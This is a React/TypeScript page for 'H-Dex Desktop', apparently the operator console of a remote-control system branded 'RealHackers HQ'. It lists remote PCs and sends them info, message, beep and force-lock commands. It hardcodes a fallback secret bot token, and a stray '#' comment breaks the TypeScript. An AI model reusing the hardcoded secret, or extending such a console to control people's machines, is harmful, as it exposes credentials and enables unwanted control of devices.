import React, { useState, useEffect, useCallback } from 'react';
import axios from 'axios';
import { 
  Monitor, Cpu, Activity, Terminal, 
  Search, ShieldCheck, Database, 
  Eye, Download, Lock,
  RefreshCcw, Settings, HardDrive, Network,
  ChevronRight, X, User, Layout, FileText, Folder, Zap,
  MessageSquare, Volume2, Info
} from 'lucide-react';
import { motion, AnimatePresence } from 'framer-motion';
import { toast } from 'sonner';

// --- TYPES ---

interface PCNode {
  id: string;
  status: string;
  model?: string;
  lastSeen?: number;
  metadata?: {
    permissions?: Record<string, boolean>;
    androidVersion?: string; # Field used for OS name on PC
    appVersion?: string;
    cpu?: number;
    ram?: number;
  }
}

interface LogEntry {
  id: string;
  text: string;
  type: 'info' | 'error' | 'success' | 'cmd' | 'result' | 'event';
  time: string;
  data?: any;
}

const HDexPage: React.FC = () => {
  const [nodes, setNodes] = useState<PCNode[]>([]);
  const [selectedNode, setSelectedNode] = useState<PCNode | null>(null);
  const [activeTab, setActiveTab] = useState<'SYSTEM' | 'TELEMETRY' | 'FILES' | 'LOGS'>('SYSTEM');
  const [searchQuery, setSearchQuery] = useState('');
  const [logs, setLogs] = useState<LogEntry[]>([]);
  const [loading, setLoading] = useState(false);

  const accentColor = '#3498db'; // PC Blue Accent

  // Settings
  const [showSettings, setShowSettings] = useState(false);
  const backendUrl = localStorage.getItem('adex_url') || 'https://talhasss-adex-backend.hf.space';
  const botToken = localStorage.getItem('adex_token') || 'talha-hq-secret-123';

  const addLog = useCallback((text: string, type: LogEntry['type'] = 'info', data?: any) => {
    const newLog: LogEntry = {
      id: Math.random().toString(36).substr(2, 9),
      text,
      type,
      time: new Date().toLocaleTimeString([], { hour12: false }),
      data
    };
    setLogs(prev => [newLog, ...prev].slice(0, 100));
  }, []);

  const fetchResults = useCallback(async () => {
    if (!selectedNode) return;
    try {
      const response = await axios.get(`${backendUrl}/api/v1/devices/${selectedNode.id}/commands/results`, {
        headers: { 'x-adex-bot-token': botToken }
      });
      const results = response.data.results || [];
      results.forEach((res: any) => {
        if (!logs.some(l => l.data?.id === res.id)) {
           addLog(`Result: ${res.command_name.toUpperCase()} -> ${res.status.toUpperCase()}`, res.status === 'success' ? 'result' : 'error', res);
        }
      });
    } catch (err) {}
  }, [selectedNode, backendUrl, botToken, logs, addLog]);

  const fetchDevices = useCallback(async () => {
    setLoading(true);
    try {
      const response = await axios.get(`${backendUrl}/api/v1/devices`, {
        params: { guildId: 'hq-guild', discordUserId: '123456789012345678' },
        headers: { 'x-adex-bot-token': botToken }
      });
      const allDevices = response.data.devices || [];
      // Filter for PC devices (identifying with -PC in appVersion)
      const pcNodes = allDevices.filter((d: any) => 
        d.app_version?.includes('PC') || d.id.startsWith('PC-')
      );
      setNodes(pcNodes);
    } catch (err: any) {} finally {
      setLoading(false);
    }
  }, [backendUrl, botToken]);

  useEffect(() => {
    document.title = "RealHackers HQ // H-Dex Desktop";
    fetchDevices();
    const interval = setInterval(() => {
      fetchDevices();
      if (selectedNode) fetchResults();
    }, 10000);
    return () => clearInterval(interval);
  }, [fetchDevices, fetchResults, selectedNode]);

  const sendCommand = async (commandName: string, payload: any = {}) => {
    if (!selectedNode) return;
    addLog(`Exec: ${commandName}`, 'cmd');
    try {
      await axios.post(`${backendUrl}/api/v1/commands`, {
        guildId: 'hq-guild', discordUserId: '123456789012345678', deviceId: selectedNode.id, commandName, payload
      }, {
        headers: { 'x-adex-bot-token': botToken }
      });
      toast.success(`COMMAND_SENT: ${commandName.toUpperCase()}`, { style: { background: '#000', color: accentColor, border: `1px solid ${accentColor}`} });
    } catch (err: any) {
      toast.error(`COMMAND_FAILED: ${err.message}`);
    }
  };

  const filteredNodes = nodes.filter(n => 
    n.id.toLowerCase().includes(searchQuery.toLowerCase()) || 
    (n.model && n.model.toLowerCase().includes(searchQuery.toLowerCase()))
  );

  return (
    <div className="container" style={{ maxWidth: '1800px', padding: '1rem' }}>
       
       <header style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', marginBottom: '1.5rem', background: 'rgba(52, 152, 219, 0.05)', padding: '1.2rem', border: '1px solid #1a3a5a' }}>
        <div style={{ display: 'flex', alignItems: 'center', gap: '1.5rem' }}>
          <ShieldCheck size={28} color={accentColor} />
          <h1 style={{ fontSize: '1.4rem', fontWeight: '900', letterSpacing: '4px' }}>H-DEX // DESKTOP_GRID</h1>
          <div style={{ width: '2px', height: '30px', background: '#1a3a5a' }} />
          <div style={{ display: 'flex', gap: '2rem', fontSize: '0.7rem', color: '#555', fontFamily: 'monospace' }}>
             <div>NODES: <span style={{ color: '#fff' }}>{nodes.length}</span></div>
             <div>STATUS: <span style={{ color: '#2ecc71' }}>CONNECTED</span></div>
          </div>
        </div>
        <div style={{ display: 'flex', gap: '1rem' }}>
           <button className="btn" onClick={() => fetchDevices()} style={{ padding: '0.6rem', borderColor: '#1a3a5a' }}><RefreshCcw size={18} className={loading ? 'spin' : ''} /></button>
        </div>
      </header>

      <div style={{ display: 'grid', gridTemplateColumns: '380px 1fr 400px', gap: '1.5rem', height: 'calc(100vh - 120px)' }}>
        
        {/* LEFT: NODE SELECTOR */}
        <div className="card" style={{ padding: '1.5rem', display: 'flex', flexDirection: 'column', border: '1px solid #1a3a5a' }}>
           <SectionTitle icon={Database} label="REMOTE_NODES" color={accentColor} />
           <div style={{ position: 'relative', marginBottom: '1.5rem' }}>
             <Search size={14} style={{ position: 'absolute', left: '12px', top: '50%', transform: 'translateY(-50%)', opacity: 0.3 }} />
             <input 
               type="text" placeholder="HOSTNAME_OR_UUID..." value={searchQuery}
               onChange={e => setSearchQuery(e.target.value)}
               style={{ background: '#000', border: '1px solid #1a3a5a', padding: '0.8rem 1rem 0.8rem 2.5rem', fontSize: '0.75rem', color: '#fff', width: '100%', outline: 'none' }}
             />
          </div>
          <div style={{ flex: 1, overflowY: 'auto' }}>
             {filteredNodes.length === 0 ? <div style={{ textAlign: 'center', opacity: 0.2, marginTop: '2rem' }}>NO_NODES_FOUND</div> : 
               filteredNodes.map(node => (
                 <div 
                   key={node.id} onClick={() => setSelectedNode(node)}
                   style={{ 
                      padding: '1.2rem', border: '1px solid #1a3a5a', marginBottom: '1rem', cursor: 'pointer',
                      background: selectedNode?.id === node.id ? 'rgba(52, 152, 219, 0.15)' : 'transparent',
                      borderLeft: selectedNode?.id === node.id ? `4px solid ${accentColor}` : '1px solid #1a3a5a',
                      transition: 'all 0.2s'
                   }}
                 >
                    <div style={{ display: 'flex', justifyContent: 'space-between', marginBottom: '8px' }}>
                       <div style={{ fontSize: '0.9rem', fontWeight: '900' }}>{node.model || 'UNKNOWN_PC'}</div>
                       <div style={{ fontSize: '0.6rem', color: node.status === 'online' ? '#2ecc71' : '#444' }}>● {node.status.toUpperCase()}</div>
                    </div>
                    <div style={{ fontSize: '0.55rem', color: '#444', fontFamily: 'monospace' }}>{node.id}</div>
                    <div style={{ marginTop: '10px', fontSize: '0.6rem', color: '#888' }}>
                       {node.metadata?.androidVersion?.toUpperCase() || 'UNKNOWN_OS'}
                    </div>
                 </div>
               ))
             }
          </div>
        </div>

        {/* MIDDLE: OPERATIONS */}
        <div style={{ display: 'flex', flexDirection: 'column', gap: '1.5rem', overflow: 'hidden' }}>
           {selectedNode ? (
             <>
                {/* Node Performance HUD */}
                <div className="card" style={{ padding: '1.5rem', border: '1px solid rgba(52, 152, 219, 0.2)' }}>
                   <div style={{ display: 'grid', gridTemplateColumns: '1fr 1fr 1fr', gap: '2rem' }}>
                      <div style={{ textAlign: 'center' }}>
                         <div style={{ fontSize: '0.6rem', color: '#444', fontWeight: 'bold' }}>CPU_LOAD</div>
                         <div style={{ fontSize: '2rem', fontWeight: '900', color: accentColor }}>??%</div>
                         <div style={{ height: '2px', background: '#111', marginTop: '5px' }}>
                            <motion.div animate={{ width: `0%` }} style={{ height: '100%', background: accentColor }} />
                         </div>
                      </div>
                      <div style={{ textAlign: 'center' }}>
                         <div style={{ fontSize: '0.6rem', color: '#444', fontWeight: 'bold' }}>MEMORY_USAGE</div>
                         <div style={{ fontSize: '2rem', fontWeight: '900', color: '#9b59b6' }}>??%</div>
                         <div style={{ height: '2px', background: '#111', marginTop: '5px' }}>
                            <motion.div animate={{ width: `0%` }} style={{ height: '100%', background: '#9b59b6' }} />
                         </div>
                      </div>
                      <div style={{ textAlign: 'center' }}>
                         <div style={{ fontSize: '0.6rem', color: '#444', fontWeight: 'bold' }}>UPLINK</div>
                         <div style={{ fontSize: '1.5rem', fontWeight: '900', color: '#2ecc71', marginTop: '5px' }}>ACTIVE</div>
                         <div style={{ height: '2px', background: '#111', marginTop: '5px' }}>
                            <motion.div animate={{ width: '100%' }} style={{ height: '100%', background: '#2ecc71' }} />
                         </div>
                      </div>
                   </div>
                </div>

                {/* Tabs */}
                <div style={{ display: 'flex', gap: '1rem', borderBottom: '1px solid #111' }}>
                  {['SYSTEM', 'TELEMETRY', 'FILES', 'LOGS'].map((tab: any) => (
                    <button 
                      key={tab} onClick={() => setActiveTab(tab)}
                      className={`tab-btn ${activeTab === tab ? 'active' : ''}`}
                      style={{ color: activeTab === tab ? accentColor : '#444', borderBottomColor: activeTab === tab ? accentColor : 'transparent' }}
                    >
                      {tab}
                    </button>
                  ))}
                </div>

                {/* Tab Content */}
                <div style={{ flex: 1, overflowY: 'auto', padding: '0.5rem' }}>
                   <AnimatePresence mode="wait">
                      {activeTab === 'SYSTEM' && (
                        <motion.div initial={{ opacity: 0 }} animate={{ opacity: 1 }} key="sys" style={{ display: 'grid', gridTemplateColumns: 'repeat(auto-fit, minmax(150px, 1fr))', gap: '1.2rem' }}>
                           <ModuleButton icon={Info} label="SYS_INFO" onClick={() => sendCommand('info')} color={accentColor} />
                           <ModuleButton icon={MessageSquare} label="SHOW_MSG" onClick={() => sendCommand('message', { text: "Hello from HQ" })} color={accentColor} />
                           <ModuleButton icon={Volume2} label="PC_BEEP" onClick={() => sendCommand('beep')} color={accentColor} />
                           <ModuleButton icon={Lock} label="FORCE_LOCK" onClick={() => sendCommand('lock')} danger />
                        </motion.div>
                      )}
                      
                      {activeTab === 'TELEMETRY' && (
                        <div style={{ textAlign: 'center', marginTop: '8rem', opacity: 0.2 }}>
                           <Activity size={48} color={accentColor} style={{ margin: '0 auto 1rem' }} />
                           <p style={{ fontSize: '0.7rem', letterSpacing: '4px' }}>WAITING_FOR_SENSORS...</p>
                        </div>
                      )}
                   </AnimatePresence>
                </div>
             </>
           ) : (
             <div style={{ flex: 1, display: 'flex', alignItems: 'center', justifyContent: 'center', flexDirection: 'column', opacity: 0.05 }}>
                <Monitor size={150} color={accentColor} />
                <h2 style={{ marginTop: '2rem', letterSpacing: '15px' }}>GRID_OFFLINE</h2>
             </div>
           )}
        </div>

        {/* RIGHT: LIVE TELEMETRY */}
        <div style={{ display: 'flex', flexDirection: 'column', gap: '1.5rem' }}>
           
           <div className="card" style={{ flex: 1, display: 'flex', flexDirection: 'column', border: '1px solid #1a3a5a' }}>
              <SectionTitle icon={Eye} label="VISUAL_INTEL" color={accentColor} />
              <div style={{ flex: 1, background: '#020202', border: '1px solid #1a3a5a', display: 'flex', alignItems: 'center', justifyContent: 'center', position: 'relative' }}>
                 <div style={{ textAlign: 'center', opacity: 0.1 }}>
                    <Monitor size={80} color={accentColor} />
                    <p style={{ fontSize: '0.6rem', marginTop: '1rem', letterSpacing: '2px' }}>WAITING_FOR_DATA...</p>
                 </div>
              </div>
           </div>

           <div className="card" style={{ height: '350px', border: '1px solid #1a3a5a', display: 'flex', flexDirection: 'column' }}>
              <SectionTitle icon={Terminal} label="CORE_LOGS" color={accentColor} />
              <div style={{ flex: 1, overflowY: 'auto', fontFamily: 'monospace', fontSize: '0.65rem', color: '#444' }}>
                 {logs.map(log => (
                    <div key={log.id} style={{ marginBottom: '8px' }}>
                       <span style={{ opacity: 0.3 }}>[{log.time}]</span> 
                       <span style={{ marginLeft: '10px', color: log.type === 'error' ? '#f55' : log.type === 'success' ? '#2ecc71' : '#fff' }}>{log.text.toUpperCase()}</span>
                    </div>
                 ))}
                 {logs.length === 0 && <div style={{ textAlign: 'center', marginTop: '4rem', opacity: 0.1 }}>LISTENING_FOR_SIGNALS...</div>}
              </div>
           </div>

        </div>

      </div>
    </div>
  );
};

const SectionTitle: React.FC<{ icon: any, label: string, color?: string }> = ({ icon: Icon, label, color }) => (
   <div style={{ display: 'flex', alignItems: 'center', gap: '0.6rem', marginBottom: '1.2rem', borderBottom: '1px solid #1a3a5a', paddingBottom: '0.6rem' }}>
     <Icon size={18} color={color || 'var(--accent-color)'} opacity={0.6} />
     <span style={{ fontWeight: '800', fontSize: '0.8rem', letterSpacing: '2px', color: '#fff' }}>{label}</span>
   </div>
 );

const ModuleButton: React.FC<{ 
   icon: any, 
   label: string, 
   onClick: () => void, 
   disabled?: boolean, 
   danger?: boolean,
   color?: string
 }> = ({ icon: Icon, label, onClick, disabled, danger, color }) => (
   <motion.button
     whileHover={disabled ? {} : { scale: 1.02, backgroundColor: danger ? 'rgba(231, 76, 60, 0.2)' : 'rgba(255,255,255,0.1)' }}
     whileTap={disabled ? {} : { scale: 0.98 }}
     onClick={onClick}
     disabled={disabled}
     className="btn"
     style={{
       flexDirection: 'column',
       height: '100px',
       gap: '0.8rem',
       width: '100%',
       justifyContent: 'center',
       border: danger ? '1px solid rgba(231, 76, 60, 0.3)' : '1px solid rgba(255,255,255,0.1)',
       color: danger ? '#e74c3c' : (color || '#fff'),
       opacity: disabled ? 0.3 : 1,
       fontSize: '0.6rem',
       padding: '0.5rem'
     }}
   >
     <Icon size={20} />
     <span style={{ fontWeight: 'bold', letterSpacing: '1px' }}>{label}</span>
   </motion.button>
 );

export default HDexPage;
